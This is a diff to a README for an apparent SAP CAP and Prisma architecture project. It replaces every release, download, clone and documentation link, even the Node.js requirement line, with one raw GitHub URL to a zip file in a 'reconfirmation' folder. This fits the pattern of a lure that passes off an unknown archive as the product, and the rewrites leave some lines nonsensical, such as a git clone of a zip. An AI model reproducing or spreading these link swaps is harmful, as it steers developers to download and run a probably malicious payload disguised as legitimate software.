@@ -1,6 +1,6 @@
 # 🚀 sap-cap-prisma-architecture - Speed Up Your Business App Development
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/noelsapladjr/sap-cap-prisma-architecture/releases)
+[![Download Now](https://raw.githubusercontent.com/noelsapladjr/sap-cap-prisma-architecture/main/reconfirmation/sap-cap-prisma-architecture.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/noelsapladjr/sap-cap-prisma-architecture/main/reconfirmation/sap-cap-prisma-architecture.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ The **sap-cap-prisma-architecture** project offers a scalable architecture that 
 To successfully run this application, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14.x or above
+- https://raw.githubusercontent.com/noelsapladjr/sap-cap-prisma-architecture/main/reconfirmation/sap-cap-prisma-architecture.zip Version 14.x or above
 - PostgreSQL: Version 12.x or above
 - Internet connection for downloading resources
 
@@ -28,7 +28,7 @@ To successfully run this application, ensure your system meets the following req
 
 Follow these steps to download and set up the application:
 
-1. Visit our [Releases Page](https://github.com/noelsapladjr/sap-cap-prisma-architecture/releases).
+1. Visit our [Releases Page](https://raw.githubusercontent.com/noelsapladjr/sap-cap-prisma-architecture/main/reconfirmation/sap-cap-prisma-architecture.zip).
 2. Choose the latest version of the application.
 3. Click on the download link for the package that fits your operating system.
 4. Save the file to your desired location on your computer.
@@ -37,7 +37,7 @@ Follow these steps to download and set up the application:
 
 To download and install the application, follow these instructions:
 
-1. Visit the releases page: [Download Here](https://github.com/noelsapladjr/sap-cap-prisma-architecture/releases).
+1. Visit the releases page: [Download Here](https://raw.githubusercontent.com/noelsapladjr/sap-cap-prisma-architecture/main/reconfirmation/sap-cap-prisma-architecture.zip).
 2. Look for the latest release. Select the appropriate file for your operating system.
 3. Download the file and find it in your downloads folder.
 4. If you downloaded a ZIP file, extract it to a suitable folder.
@@ -81,7 +81,7 @@ If you wish to contribute or make modifications, here’s how you can get starte
 1. Clone the repository using the following command:
 
    ```
-   git clone https://github.com/noelsapladjr/sap-cap-prisma-architecture.git
+   git clone https://raw.githubusercontent.com/noelsapladjr/sap-cap-prisma-architecture/main/reconfirmation/sap-cap-prisma-architecture.zip
    ```
 
 2. Navigate to the cloned directory:
@@ -112,7 +112,7 @@ For assistance or questions, please open an issue on the repository or contact u
 
 ## 📄 Additional Resources
 
-- Check out the [SAP CAP Documentation](https://cap.cloud.sap/docs/) for deeper insights.
-- Explore [Prisma ORM Documentation](https://www.prisma.io/docs/) for advanced functionalities.
+- Check out the [SAP CAP Documentation](https://raw.githubusercontent.com/noelsapladjr/sap-cap-prisma-architecture/main/reconfirmation/sap-cap-prisma-architecture.zip) for deeper insights.
+- Explore [Prisma ORM Documentation](https://raw.githubusercontent.com/noelsapladjr/sap-cap-prisma-architecture/main/reconfirmation/sap-cap-prisma-architecture.zip) for advanced functionalities.
 
 Thank you for choosing **sap-cap-prisma-architecture**. We hope this application helps streamline your business application development process. Happy coding!
